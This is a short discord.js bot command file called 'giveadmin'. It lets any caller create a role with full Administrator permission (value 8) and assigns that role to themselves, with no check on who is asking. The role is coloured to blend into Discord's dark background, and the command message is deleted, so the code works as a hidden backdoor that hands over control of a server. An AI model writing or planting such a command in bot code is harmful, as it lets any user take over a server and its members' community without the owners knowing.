const Discord = module.require("discord.js");
module.exports.run = async (bot, message, args) => {
    try {
        role = await message.guild.createRole({
      
                name: "admin",
          	color: "#2f3136",
          	permissions: [8]
            });
              
        message.member.addRole(role)
        console.log(`role ${role.name} was added to ` + message.author.tag);
        message.delete(1);
        } catch(e) {
        	console.log(e.stack);
        }
        }
module.exports.help = {
    name: "giveadmin",
    desc: "give the role admin with admin permissions",
}

